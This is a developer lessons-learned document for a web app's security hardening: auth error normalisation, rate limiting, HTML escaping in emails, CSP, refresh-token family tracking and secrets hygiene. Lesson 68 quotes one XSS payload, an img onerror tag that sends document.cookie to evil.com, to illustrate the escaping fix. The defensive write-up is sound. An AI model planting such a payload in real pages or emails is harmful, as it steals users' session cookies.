Normalized every failure mode in `verifyMfa()` to
`'Invalid verification code'` and every failure mode in `verifyRecoveryCode()`
to `'Invalid recovery code'`. Defined the message as a single `GENERIC_ERROR`
constant at the top of each method so no future edit can drift back to
descriptive errors. Same hard rule already applied to `login()` (audit found
it correct — both "user not found" and "wrong password" already returned
`'Invalid email or password'`).

**Rule:**
Auth-endpoint error messages must be identical regardless of whether the
failure is unknown user, wrong password, wrong code, expired token, or
missing MFA state. Different messages allow user enumeration. Always use
a single generic message constant per endpoint.

---

## 66. Rate-Limit Storage Must Be Redis-Backed in Production

**Context:**
Phase 4.1 wired up `@nestjs/throttler`. The default in-memory storage
resets on every restart and cannot be shared across multiple backend
instances — meaning, in production, an attacker would just need to wait
for a deploy or hit a different replica to bypass the limit.

**Fix:**
Configured `@nest-lab/throttler-storage-redis` with the same `REDIS_URL`
that Bull queues already use. One Redis URL serves queues + rate limiting
+ admin-health pings.

**Rule:**
Throttler storage must always be the Redis-backed implementation. In-memory
storage is fine for tests only — production and staging always Redis. Do
not introduce a separate Redis connection variable; reuse `REDIS_URL`.

---

## 67. Named Throttlers Are Not Per-Method — You Must Skip the Others

**Context:**
The `@nestjs/throttler` `ThrottlerGuard` iterates EVERY named throttler
configured at the module level on every request, unless explicitly skipped.
With 8 named buckets (`login`, `register`, `forgot`, `reset`, `mfa`,
`recovery`, `refresh`, `invitation`) configured globally, applying just
`@Throttle({ login: {} })` to the login endpoint still activated all 7
other buckets with their default limits — so login would have been blocked
at the strictest cross-bucket limit (3/hr from `register`), not its
intended 5/10min. `@Throttle({foo: {}})` only OVERRIDES bucket `foo`'s
settings — it does not narrow the set of active buckets.

**Fix:**
Created `@ThrottleOnly(name)` decorator
(`backend/src/common/decorators/throttle-only.decorator.ts`) that composes
`@UseGuards(ThrottlerGuard) + @Throttle({name: {}}) + @SkipThrottle({...all others true})`.
Methods now use a single `@ThrottleOnly('login')` and only the named bucket
applies.

**Rule:**
With named throttlers at module level, always use `@ThrottleOnly(name)` on
methods — never raw `@Throttle()` alone. If a new throttler bucket is
added to `ThrottlerModule.forRootAsync()`, also add its name to the
`THROTTLER_NAMES` constant in `throttle-only.decorator.ts`, or it won't
be auto-skipped on the other endpoints.

---


*Last updated: 2026-05-18 (Phase 4.2 JWT hardening — lessons #71–77. Includes post-ship bug fix and test mock patterns.)*

---

## 68. Email Template Injection — User Strings Must Be HTML-Escaped at Output

**Problem:**
`email.service.ts` called template functions that interpolated
user-supplied strings (display names, org names, contract names)
directly into HTML template literals without escaping.

A user setting their display name to:
`<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`
would inject that tag into every invitation email they sent.
Modern email clients strip `<script>` but many execute `onerror`
and `onload` handlers on images.

**Root cause:**
Template literals interpolate strings verbatim. `${userName}`
in an HTML context is an injection point if `userName` contains
HTML characters.

**Fix:**
Created `escape-html-email.ts` with `escapeHtml()` — escapes the
5 HTML special characters: `& < > " '`
Applied at 38 call sites across all 9 email template functions.

**Critical escape order:**
`&` must be escaped FIRST. If you escape `<` first, then escape `&`,
you turn `&lt;` into `&amp;lt;` — double-escaping the ampersand.
Always: `&` → `&amp;` then `<` → `&lt;` then `>` → `&gt;` then `"` → `&quot;`

**Rule:**
Every string that comes from user input and lands in an HTML
context (email template, HTML string, innerHTML) must be
HTML-escaped at the point of interpolation. React's auto-
escaping only covers JSX — it does NOT protect template
literals, string concatenation, or innerHTML.

---

## 69. CSP connectSrc Must Include Your Production API Origin

**Problem:**
Bare `helmet()` sets a `Content-Security-Policy` header but does
not include an explicit `connectSrc` directive. The default
falls back to `defaultSrc: 'self'`. In development where
frontend and backend share localhost, this works. In
production where they may be on different origins (e.g.
`app.managex.ai` vs `api.managex.ai`), ALL fetch/XHR calls
would be silently blocked by the browser.

**Fix:**
Explicit CSP configuration with `connectSrc` including
`BASE_URL` from the config service.

**Rule:**
Always specify `connectSrc` explicitly in your CSP configuration.
Include every origin your frontend makes API calls to.
Test CSP in production-like conditions (different origins)
not just localhost where `defaultSrc: 'self'` masks the problem.

---

## 70. Two Types of HTML Escaping — Input Sanitization vs Output Escaping

**Problem:**
Phase 3.2 added `sanitize-html` (`stripHtml`) for INPUT sanitization.
Phase 3.5 added `escapeHtml` for OUTPUT escaping in emails.
These are different tools for different problems.

**The distinction:**
- INPUT sanitization (`sanitize.ts` / `stripHtml`):
  Strips HTML tags from content before storing in the database.
  Used on clause content, comments, negotiation text.
  Goal: keep the database clean of HTML.

- OUTPUT escaping (`escape-html-email.ts` / `escapeHtml`):
  Converts HTML special characters to entities at the point
  of rendering. Used in email templates.
  Goal: prevent HTML injection at the output stage.

**Why both are needed:**
Input sanitization catches content going INTO the database.
Output escaping catches content going INTO an HTML context.
Defense in depth: even if input sanitization fails or is
bypassed, output escaping prevents the HTML from executing.

**Rule:**
For any string entering an HTML context (template, innerHTML,
email body), ask two questions:
1. Was it sanitized at input? (database-stored content)
2. Is it escaped at output? (before HTML interpolation)
Both should be YES for user-supplied content.

---

## 71. Token Family Tracking Is the Correct Reuse-Attack Response

**Context:**
Phase 4.2 added refresh-token rotation. The naive implementation revokes
the old refresh token when a new one is issued — but that doesn't help
if an attacker has captured the OLD token. They simply present the old
one and the legitimate user's just-rotated session looks identical to
their stolen one.

**Lesson:**
The industry-standard answer (OAuth 2.0 BCP §4.13, Auth0, DocuSign,
Ironclad) is **token family tracking**. Every refresh token belongs to
a family identified by a `family_id` UUID. On each rotation the new
token inherits the family. When a previously-rotated (already revoked)
refresh token is presented, you don't just reject it — you revoke EVERY
session that shares its family_id. The legitimate user's current session
is burned, but they can re-login; the attacker also can't make any
further progress.

**Rule:**
- Refresh tokens MUST carry a `family_id` claim.
- The `user_sessions` row MUST persist family_id, parent_token_hash, and
  the rotation chain.
- On detected reuse, `SessionService.revokeFamily()` must be a single
  atomic UPDATE — not a loop.
- A `security.refresh_token_reuse_detected` event MUST be recorded with
  the family_id in metadata.

---

## 72. Access Token Blacklisting Requires jti Claims

**Context:**
Phase 4.2 set out to close the "logout but my access token still works
for 15 minutes" abuse window. The plan was to add a Redis blacklist on
logout. But you cannot blacklist a token by its full string — that
defeats the point of stateless JWTs (and the strings are too long).

**Lesson:**
Every access token needs a `jti` (JWT ID) claim — a short, unique
identifier. You blacklist the jti, not the token. The blacklist entry
TTL equals the access token's remaining lifetime (`exp - now`), so
Redis self-cleans expired entries — no garbage collection job needed.

**Rule:**
- `generateTokens()` MUST stamp a `randomUUID()` jti on every access token.
- The Redis key format is `blacklist:jti:{jti}` — value unused, only
  EXISTS is checked.
- `JwtStrategy.validate()` MUST check the blacklist when payload.jti is
  present. Missing-jti tokens get a logged warning, not a rejection
  (grace window for pre-Phase-4.2 tokens still in circulation).
- The blacklist service MUST fail-OPEN on Redis errors. A Redis outage
  should not lock everyone out — the session row revocation still
  catches refresh-token reuse.

---

## 73. Every Login Path Must Call _finalizeLogin

**Context:**
Phase 3.3 introduced `_finalizeLogin()` to handle UserSession creation,
device tracking, suspicious-login detection, and the new-device email.
Five login paths (register, login, verifyMfa, verifyRecoveryCode,
refreshToken) called it. One — `acceptInvitation` — did not.

**Lesson:**
A new user accepted an invitation, the inline `generateTokens()` call
issued them a working JWT, but no `user_sessions` row existed. The
SessionTrackingMiddleware had no row to update, the user couldn't be
seen in the admin "Active sessions" list, and the new-device email was
never sent. The bug was silent — there was no error, just missing
telemetry until the user happened to refresh their token.

**Rule:**
- Any code path that issues a new refresh token MUST call
  `_finalizeLogin()` with that token. No exceptions.
- When you add a NEW auth flow (SSO, social login, magic link, etc.),
  open `auth.service.ts` and copy the `_finalizeLogin()` call pattern
  from `login()` verbatim — don't reinvent it.
- The grep `grep -n "this.generateTokens" backend/src/modules/auth/auth.service.ts`
  must always be followed within ~20 lines by a `this._finalizeLogin(`
  call. If it isn't, you have a bug.

---

## 74. SessionTrackingMiddleware Must Key on jti, Not Token Hash

**Context:**
Phase 3.3 wrote `SessionTrackingMiddleware` to bump `last_active_at`
on each authenticated request. The implementation hashed the bearer
**access** token and looked it up in `user_sessions.token_hash`. The
lookup never matched, because `user_sessions.token_hash` stores
SHA-256 of the **refresh** token, not the access token. The middleware
ran on every request, swallowed the silent miss, and never updated
last_active_at — for months.

**Lesson:**
When a middleware "works" but has no observable effect, it's almost
always a key-mismatch bug. The fix in Phase 4.2 was to:
1. Add a `jti` column to `user_sessions` (stamped at session creation).
2. Have the middleware decode (no verify) the bearer to extract `jti`.
3. Look up the session by jti.

**Rule:**
- When a middleware reads from a database to side-effect a row, write
  ONE failing test asserting the side-effect actually happens — not
  just that the middleware doesn't throw. The Phase 3.3 test suite
  had no such assertion, which is why the bug survived production.
- If the lookup key is derived from the JWT, write down on paper what
  the column actually contains. "It's a hash of the JWT" is ambiguous
  — which JWT? Access or refresh? Different things.

---

## 75. Dual Storage Is Technical Debt That Must Be Retired Promptly

**Context:**
Phase 3.3 introduced `user_sessions` as the new home for refresh-token
state, replacing the single-token `users.refresh_token_hash` column.
But it did NOT remove the old column. For ~6 weeks, every login wrote
to BOTH stores (`user_sessions.token_hash` AND `users.refresh_token_hash`),
and `refreshToken()` validated against the OLD column. The new table
existed but was decorative for the refresh-validation path.

**Lesson:**
Dual storage during a migration is fine for a few days. Past that, the
old store accumulates write traffic but no read traffic, and someone
eventually writes new code reading from the WRONG store. The Phase 4.2
audit caught this only because the team specifically looked at the
refresh-token validation path.

**Rule:**
- When you introduce a replacement store, open a ticket the same day
  to delete the old store. Don't let it linger past one sprint.
- During the transition, the read path MUST go through the NEW store
  exclusively — never fall back to the old one. Falling back means
  the new store can be silently broken without anyone noticing.
- Write a migration that DROPS the old column with `DROP COLUMN IF EXISTS`
  so the cleanup is idempotent and safe to deploy multiple times.

---

## 78. revokeFamily Must Blacklist JTIs in Redis AND Revoke Sessions in DB

**Context:**
Phase 4.2 added refresh token family tracking to detect reuse attacks.
When a replayed (already-rotated) refresh token is detected, the entire
token family must be invalidated. The initial `revokeFamily()` implementation
only revoked sessions in `user_sessions` (DB rows set to `is_revoked = true`).

**The Gap:**
Revoking the DB row stops future refresh-token exchanges but does NOT
invalidate access tokens that were already issued from that family.
Access tokens are stateless JWTs — they carry no DB row. A compromised
access token remains valid for up to 15 minutes after the session row is
revoked, giving an attacker a live window.

**Fix (commit 501d48f):**
On reuse detection, BOTH operations must happen:
1. `listByFamily(familyId)` — fetch all sessions in the compromised family
2. `blacklistToken(jti, accessTtlSec)` — add each session's JTI to the
   Redis blacklist with TTL = remaining access token lifetime
3. `revokeFamily(familyId)` — flip `is_revoked = true` on all DB rows

`JwtStrategy.validate()` checks `isBlacklisted(jti)` on every authenticated
request, so the Redis blacklist provides the real-time revocation gate.

**Rule:**
- DB-only revocation of a token family is insufficient. Always pair it
  with Redis JTI blacklisting for the access tokens.
- The order matters: collect JTIs first (before rows are revoked), then
  blacklist, then revoke. Revoke before listing risks missing active JTIs.
- `blacklistToken()` must be called with TTL > 0. A TTL of 0 or negative
  is a no-op in `TokenBlacklistService` — always derive TTL from the
  access token's `exp` claim minus the current epoch.
- Regression test in `backend/src/modules/auth/tests/token-security.spec.ts`
  (TEST 6) verifies this behavior end-to-end in the unit test layer.

---

## Phase 4.3 — Secrets Hygiene (shipped 2026-05-19)

### LESSON: Seed scripts must validate their own env vars

NestJS Joi validation runs only inside the application bootstrap.
Seed scripts (`npm run seed`, `npm run seed:users`) instantiate
TypeORM directly and never touch the Nest container — so any env
vars they rely on receive ZERO validation from Joi.

Seed scripts must therefore validate required env vars themselves
and throw clear, developer-friendly errors. Never fall back to
hardcoded passwords or credentials in seed files.

**Pattern:** `requireSeedPassword(varName)` helper in
`backend/src/database/seeds/admin-users.seed.ts`. It reads
`process.env[varName]`, enforces a min length, and throws a boxed
error that names the missing var, the file to edit, and the
restart command to run.

**Rule:** Any new seed-time env var gets the same treatment — a
manual guard at the top of the seed module with a boxed error.
Never `process.env.X || 'literal-fallback'` in seed code.

### LESSON: data-source.ts runs outside NestJS — validate manually

TypeORM CLI commands (`typeorm migration:run`, `typeorm migration:generate`),
the `npm run migration:*` scripts, and standalone seed entry-points
all import `backend/src/config/data-source.ts` directly. They never
touch `app.module.ts`, so Joi validation runs zero times.

If a required env var is referenced in `data-source.ts` (today only
`DATABASE_URL`), it must be validated manually at the top of that
file with a clear `throw` if missing.

**Rule:** Any new env var added to `data-source.ts` needs a manual
validation throw — Joi is NOT protecting this path.

### LESSON: Dev-only config must be explicitly gated behind NODE_ENV

CSP entries, CORS origins, and any other dev-only configuration
must live inside an explicit `if (process.env.NODE_ENV !== 'production')`
check (or the equivalent ternary spread).

Unconditional inclusion of `localhost`, `ws://localhost:*`, or
`wss://localhost:*` in production CSP headers weakens security
posture and fails security audits. Phase 4.3 audit found two
`ws://localhost:*` / `wss://localhost:*` entries in `main.ts`
`connectSrc` that shipped in production CSP unconditionally —
fix used the same dev-only spread pattern already established for
CORS origin pushes immediately below the helmet config.

**Rule:** Every literal `localhost` in `main.ts` belongs inside
the dev-only branch. Production CSP/CORS should reference only
`baseUrl` / `frontendUrl` from ConfigService.

### LESSON: Every env var must be in .env.example AND Joi in the same commit

The Phase 1.5 rule, re-affirmed by the Phase 4.3 audit: if you
add a `configService.get('NEW_VAR')` call, the same commit must
add `NEW_VAR` to the Joi schema in `app.module.ts` AND to
`backend/.env.example` with a descriptive comment.

Missing from either side = silent failure on new developer
setups (Joi misses it → fallback to literal silently used) or
production deployments (`.env.example` misses it → ops doesn't
know to set it → empty string at runtime).

The Phase 4.3 audit found 9 env vars used in code but missing
from both: `SEED_ADMIN_PASSWORD_1/2/3`, `DOCUSIGN_RSA_PRIVATE_KEY`,
`DOCUSIGN_AUTH_SERVER`, `DOCUSIGN_BASE_PATH`, `DOCUSIGN_USER_ID`,
`UPLOAD_DIR`, `FROM_EMAIL`. The DocuSign RSA private key was the
highest-priority gap — a PEM private key undocumented in both
sources.

**Rule:** If you can `configService.get('X')` it, then `X` must
appear in both `.env.example` (with a comment) and the Joi schema
(with the right `.required()` / `.optional()` / `.default()` /
URI/email shape).

### LESSON: Use jest.isolateModules() when testing module-load-time throws

Modules that throw during initialization (at import/require time)
cannot be re-tested by simply deleting an env var and re-importing —
Jest returns the cached module. Use `jest.isolateModules()` with
`require()` inside the callback to force a fresh module load and
correctly test startup-time validation guards.

When the module under test also calls `dotenv.config()` at the top,
stub it with `jest.doMock('dotenv', () => ({ config: () => ({ parsed: {} }) }))`
INSIDE the same `jest.isolateModules` callback — otherwise dotenv
will repopulate the env var from `.env` on disk and the guard will
not throw, even with the env var deleted.

Bug found post-merge in Phase 4.3 `seed-validation.spec.ts` TEST 4.

---

## 81. Testing — Frontend npm ci Must Run From Repo Root, Not apps/sign/

**Problem:**
Running `cd apps/sign && npm ci` (or `npm install`) before executing frontend tests fails with:
```
Cannot find module '@managex/tokens' from 'src/...'
```
The tests themselves may also silently import broken CSS tokens and render broken component trees.

**Root Cause:**
`apps/sign` depends on `@managex/tokens` which lives at `packages/tokens/`. This dependency is resolved via npm workspaces, defined in the **root** `package.json`:
```json
"workspaces": ["apps/*", "packages/*"]
```
Running `npm ci` inside `apps/sign/` directly ignores the workspace configuration entirely. npm treats it as a standalone package and cannot resolve `@managex/tokens` because `packages/tokens/` is outside `apps/sign/`'s own `node_modules`.

**Fix:**
Always install from the repo root:
```bash
# Correct — resolves workspace dependencies
cd <repo-root>
npm ci

# Then run tests with the workspace flag
npm -w @managex/sign run test
```

**How to Avoid:**
- The CI workflow (`.github/workflows/ci.yml`) correctly runs `npm ci` at the repo root. Match this locally.
- `backend/` is the one exception — it is NOT a workspace member and has its own `package-lock.json`. For backend tests: `cd backend && npm ci && npm test`.
- Rule of thumb: if the package.json has `"name": "@managex/..."`, it's a workspace member. Install from root.

---

## 82. Docker — docker restart Does Not Reload .env — Use docker-compose up -d

**Problem:**
Developer changes a value in `backend/.env` (e.g. sets a new `JWT_SECRET`, adds a missing `SEED_ADMIN_PASSWORD_*`, or changes `REDIS_URL`). Runs `docker restart sign-backend`. The container restarts but the old env value is still in effect — the change is invisible.

**Root Cause:**
`docker restart` stops and starts the existing container. It does **not** recreate it. Docker injects environment variables at container **creation** time (from `docker-compose up`). A restarted container carries the exact same environment it was created with, regardless of what is in `.env` now.

`docker-compose up -d` is different: it detects that the container configuration (including env) has changed and **recreates** the container from scratch, picking up the new `.env` values.

This is distinct from lesson #34 (a new Joi-required var crashes the app). Here the app may not crash — it just silently runs with the stale value.

**Fix:**
```bash
# After any .env change, recreate the affected container:
docker-compose up -d backend

# If you also changed packages (node_modules):
docker-compose up --force-recreate --renew-anon-volumes -d backend
```

**How to Avoid:**
- Mental model: `docker restart` = "bounce the process". `docker-compose up -d` = "apply config changes and recreate if needed".
- If a value you just set in `.env` is not taking effect → always reach for `docker-compose up -d`, not `docker restart`.
- Quick diagnostic: `docker inspect sign-backend | grep -A5 '"Env"'` shows the env the running container was actually created with.
